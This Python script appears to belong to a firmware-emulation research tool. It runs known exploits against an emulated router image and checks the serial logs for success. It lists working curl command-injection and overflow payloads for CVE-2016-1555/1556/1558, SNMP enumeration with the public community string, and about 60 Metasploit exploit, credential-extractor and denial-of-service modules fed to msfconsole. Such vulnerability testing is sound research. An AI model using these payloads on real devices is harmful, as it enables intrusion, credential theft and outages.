#!/usr/bin/env python3

import sys
import getopt
import subprocess
# import contextlib
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '../scripts'))
from psql_firmware import psql
from test_network_reachable import closeIp


SHELL_EXPLOITS = {
    200: ("curl -L --max-redir 0 -m 5 -s -f -X POST -d \"macAddress=000000000000;cat DEADBEEF1;&reginfo=1&writeData=Submit\" http://%(target)s/boardData102.php", "grep -qs \"DEADBEEF1\" ./scratch/%(iid)d/qemu.final.serial.log"),  # CVE-2016-1555
    201: ("curl -L --max-redir 0 -m 5 -s -f -X POST -d \"macAddress=000000000000;cat DEADBEEF2;&reginfo=1&writeData=Submit\" http://%(target)s/boardData103.php", "grep -qs \"DEADBEEF2\" ./scratch/%(iid)d/qemu.final.serial.log"),  # CVE-2016-1555
    202: ("curl -L --max-redir 0 -m 5 -s -f http://%(target)s/ROM-0", ""),  # https://rootatnasro.wordpress.com/2014/01/11/how-i-saved-your-a-from-the-zynos-rom-0-attack-full-disclosure/
    203: ("curl -L --max-redir 0 -m 5 -s -f -b dlink_uid=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA http://%(target)s/session_login.php", "grep -qs \"BadVA : 41414141\" ./scratch/%(iid)d/qemu.final.serial.log"),  # CVE-2016-1558
    204: ("curl -L --max-redir 0 -m 5 -s -f -X POST -d \"macAddress=000000000000;cat DEADBEEF3;&reginfo=1&writeData=Submit\" http://%(target)s/boardDataJP.php", "grep -qs \"DEADBEEF3\" ./scratch/%(iid)d/qemu.final.serial.log"),  # CVE-2016-1555
    205: ("curl -L --max-redir 0 -m 5 -s -f -X POST -d \"macAddress=000000000000;cat DEADBEEF4;&reginfo=1&writeData=Submit\" http://%(target)s/boardDataNA.php", "grep -qs \"DEADBEEF4\" ./scratch/%(iid)d/qemu.final.serial.log"),  # CVE-2016-1555
    206: ("curl -L --max-redir 0 -m 5 -s -f -X POST -d \"macAddress=000000000000;cat DEADBEEF5;&reginfo=1&writeData=Submit\" http://%(target)s/boardDataWW.php", "grep -qs \"DEADBEEF5\" ./scratch/%(iid)d/qemu.final.serial.log"),  # CVE-2016-1555
    207: ("curl -L --max-redir 0 -m 5 -s -f http://%(target)s/getBoardConfig.php", "grep -qs -e \"WPS PIN\" -e \"PASSPHRASE\" %(outfile)s"),  # CVE-2016-1556
    208: ("curl -L --max-redir 0 -m 5 -s -f \"http://%(target)s/mfgwrite.php?product=;cat DEADBEEF6\"", "grep -qs \"DEADBEEF6\" ./scratch/%(iid)d/qemu.final.serial.log"),
    209: ("snmpwalk -v2c -c public %(target)s .iso", "grep -qs \".2.1.3.3.2.1.1.4\" %(outfile)s"),  # CVE-2016-1559
    210: ("snmpwalk -v2c -c public %(target)s .iso", "grep -qs \".4.1.1.1\" %(outfile)s "),  # CVE-2016-1559
    211: ("snmpwalk -v2c -c public %(target)s iso.3.6.1.4.1.4526.100.7.8.1.5", ""),  # CVE-2016-1557
    212: ("snmpwalk -v2c -c public %(target)s iso.3.6.1.4.1.4526.100.7.9.1.5", ""),  # CVE-2016-1557
    213: ("snmpwalk -v2c -c public %(target)s iso.3.6.1.4.1.4526.100.7.9.1.7", ""),  # CVE-2016-1557
    214: ("snmpwalk -v2c -c public %(target)s iso.3.6.1.4.1.4526.100.7.10.1.7", ""),  # CVE-2016-1557
    #  215 : ("curl -L --max-redir 0 -m 5 -s -f http://%(target)s/userRpmNatDebugRpm26525557/linux_cmdline.html", ""), # http://websec.ca/advisories/view/root-shell-tplink-wdr740
}

METASPLOIT_EXPLOITS = {
    0: "use exploits/linux/http/airties_login_cgi_bof",
    1: "use exploits/linux/http/belkin_login_bof",
    2: "use exploits/linux/http/ddwrt_cgibin_exec",
    3: "use exploits/linux/http/dlink_authentication_cgi_bof",
    4: "use exploits/linux/http/dlink_command_php_exec_noauth",
    5: "use exploits/linux/http/dlink_diagnostic_exec_noauth",
    6: "use exploits/linux/http/dlink_dir300_exec_telnet",
    7: "use exploits/linux/http/dlink_dir605l_captcha_bof",
    8: "use exploits/linux/http/dlink_dir615_up_exec",
    9: "use exploits/linux/http/dlink_dspw110_cookie_noauth_exec",
    10: "use exploits/linux/http/dlink_dspw215_info_cgi_bof",
    11: "use exploits/linux/http/dlink_hedwig_cgi_bof",
    12: "use exploits/linux/http/dlink_hnap_bof",
    13: "use exploits/linux/http/dlink_hnap_header_exec_noauth",
    14: "use exploits/linux/http/dlink_upnp_exec_noauth",
    # 15: "use exploits/router/dreambox_openpli_shell",
    16: "use exploits/linux/http/fritzbox_echo_exec",
    17: "use exploits/linux/http/linksys_apply_cgi",
    # 18: "use exploits/linux/http/linksys_e1500_apply_exec",
    19: "use exploits/linux/http/linksys_themoon_exec",
    # 20: "use exploits/linux/http/linksys_wrt54gl_apply_exec",
    # 21: "use exploits/linux/http/linksys_wrt110_cmd_exec",
    # 22: "use exploits/linux/http/linksys_wrt160nv2_apply_exec",
    23: "use exploits/linux/http/multi_ncc_ping_exec",
    24: "use exploits/linux/http/netgear_dgn1000b_setup_exec",
    # 25: "use exploits/linux/http/netgear_dgn2200b_pppoe_exec",
    26: "use exploits/linux/http/netgear_readynas_exec",
    27: "use exploits/linux/http/realtek_miniigd_upnp_exec_noauth",
    28: "use exploits/linux/http/seagate_nas_php_exec_noauth",
    29: "use exploits/linux/misc/sercomm_exec",
    30: "use exploits/linux/upnp/dlink_upnp_msearch_exec",
    31: "use exploits/linux/upnp/miniupnpd_soap_bof",
    32: "use exploits/multi/http/cisco_dcnm_upload",
    33: "use exploits/multi/upnp/libupnp_ssdp_overflow",
    # 34: "use exploits/unix/dhcp/bash_environment",
    # 35: "use auxiliary/router/cisco_secure_acs_bypass",
    36: "use auxiliary/admin/cisco/vpn_3000_ftp_bypass",
    37: "use auxiliary/admin/http/arris_motorola_surfboard_backdoor_xss",
    38: "use auxiliary/admin/http/dlink_dir_300_600_exec_noauth",
    39: "use auxiliary/admin/http/dlink_dir_645_password_extractor",
    40: "use auxiliary/admin/http/dlink_dsl320b_password_extractor",
    41: "use auxiliary/admin/http/intersil_pass_reset",
    # 42: "use auxiliary/admin/http/linksys_e1500_e2500_exec",
    43: "use exploits/router/linksys_tmunblock_admin_reset_bof",
    # 44: "use auxiliary/admin/http/linksys_wrt54gl_exec",
    45: "use auxiliary/admin/http/netgear_soap_password_extractor",
    46: "use auxiliary/admin/http/zyxel_admin_password_extractor",
    47: "use auxiliary/admin/misc/sercomm_dump_config",
    48: "use auxiliary/admin/motorola/wr850g_cred",
    49: "use auxiliary/admin/vxworks/apple_airport_extreme_password",
    50: "use auxiliary/admin/vxworks/dlink_i2eye_autoanswer",
    51: "use auxiliary/admin/vxworks/wdbrpc_memory_dump",
    52: "use auxiliary/admin/vxworks/wdbrpc_reboot",
    53: "use auxiliary/dos/cisco/ios_http_percentpercent",
    54: "use auxiliary/dos/dhcp/isc_dhcpd_clientid\nset RIP %(target)s",
    # 55 : "use auxiliary/router/ntpd_reserved_dos",
    56: "use auxiliary/dos/upnp/miniupnpd_dos",
    57: "use auxiliary/scanner/http/cisco_ios_auth_bypass",
    58: "use auxiliary/scanner/http/cisco_nac_manager_traversal",
    59: "use auxiliary/scanner/http/dlink_user_agent_backdoor",
    60: "use auxiliary/scanner/http/linksys_e1500_traversal",
    61: "use auxiliary/scanner/http/goahead_traversal",
    62: "use auxiliary/scanner/http/litespeed_source_disclosure\nset PATH_SAVE /tmp/",
    63: "use auxiliary/scanner/http/netgear_sph200d_traversal",
    64: "use auxiliary/scanner/ssl/openssl_ccs",
    65: "use auxiliary/scanner/ssl/openssl_heartbleed",
    66: "use auxiliary/scanner/http/allegro_rompager_misfortune_cookie",
    67: "use auxiliary/dos/dns/bind_tkey",
    68: "use exploits/linux/http/synology_dsm_sliceupload_exec_noauth",
    69: "use auxiliary/scanner/snmp/sbg6580_enum",
    70: "use auxiliary/scanner/snmp/arris_dg950",
    71: "use exploit/linux/http/dlink_hnap_login_bof",
}


def exploit_metasploit(target, eid, outfile):
    return "spool " + outfile % locals() + "\n" +\
        METASPLOIT_EXPLOITS[eid] % locals() + "\n"\
        "exploit -z\n"\
        "spool off\n"\
        "sessions -K\n"


def exploit_shell(target, eid, outfile, iid):
    print("Executing shell command eid=%(eid)d..."%locals())

    # create log file for this shell command execution
    with open(outfile % locals(), 'w') as f:
        ret = subprocess.call(SHELL_EXPLOITS[eid][0] % locals(),
                              stderr=f, stdout=f, shell=True)
        # always run verification command if available; do not attempt early
        # termination if the first command appears to fail
        # this fixes e.g. 203, which crashes the HTTP server and causes curl to
        # return CURLE_GOT_NOTHING (52)
        if SHELL_EXPLOITS[eid][1]:
            ret = subprocess.call(SHELL_EXPLOITS[eid][1] % locals() % locals(),
                                  stderr=f, stdout=f, shell=True)
        f.write("\nResult: %d\n" % ret)


def process(target, exploits, iid):
    outfile = "./scratch/%(iid)s/exploits/%%(eid)s.log"%locals()
    outdir=os.path.dirname(outfile)
    os.makedirs(outdir, exist_ok=True)
    localserver = closeIp(target)
    cmd = "setg RHOST %(target)s\n"\
        "setg RHOSTS %(target)s\n"\
        "setg SRVHOST %(localserver)s\n"\
        "setg LHOST %(localserver)s\n"\
        "\n" % locals()

    # not great performance, because we will wait until all exploits have
    # been processed before starting metasploit with the script
    for eid in sorted(exploits):
        if eid in METASPLOIT_EXPLOITS:
            cmd += exploit_metasploit(target, eid, outfile) + "\n"
        elif eid in SHELL_EXPLOITS:
            exploit_shell(target, eid, outfile, iid)
        else:
            print("Unrecognized exploit id: %d" % eid)
    cmd += "quit"

    # write metasploit script to attempt exploits
    print("Writing %(outdir)s/script.rc..."%locals())
    with open("%(outdir)s/script.rc"%locals(), 'w') as f:
        f.write(cmd)

    # create log file for all metasploit exploit execution
    print("Executing metasploit command...")
    with open("%(outdir)s/metasploit.log"%locals(), 'w') as f:
        ret = subprocess.call(['/bin/sh', '-c', 'msfconsole -qnr %(outdir)s/script.rc'%locals()],
                              stderr=f, stdout=f)
        f.write("\nResult: %d" % ret)
    # try:
    #     print('merging all exploit logs')
    #     with open('%(outdir)s/all_exploits.log'%locals(), 'w') as fout:
    #         for eid in sorted(exploits):
    #             with open(outfile % locals(), 'r') as fin:
    #                 cont = fin.read()
    #                 fout.write('<< eid=%(eid)d >> \n'%locals())
    #                 fout.write(cont)
    #                 fout.write('\n')
    #             os.remove(outfile % locals())
    # except BaseException as ex:
    #     print(ex)
    #     import traceback
    #     traceback.print_exc()

def print_usage():
    print(''' Usage Example for Netgear WNAP320 firmware V2.0.3:
    see https://github.com/firmadyne/firmadyne#usage 3.2.0:
    {0} -i 1097
    {0} -t 192.168.0.50  -i 1097
    '''.format(sys.argv[0]))

def main():
    exploits = list(METASPLOIT_EXPLOITS.keys()) + list(SHELL_EXPLOITS.keys())
    opts, argv = getopt.getopt(sys.argv[1:], 'e:t:o:i:')
    for k, v in opts:
        if k == '-e':
            exploits = [int(_) for _ in v.split(',')]
        if k == '-t':
            target = v
        if k == '-i':
            iid = int(v)
    if 'iid' not in locals():
        print_usage()
        return
    if 'target' not in locals():
        target = psql("SELECT guest_ip FROM image WHERE id=%d"%iid)[0][0]
        print('target=%(target)s'%locals())
    try:
        process(target, exploits, iid)
    except NameError:
        print_usage()
        return

if __name__ == "__main__":
    main()
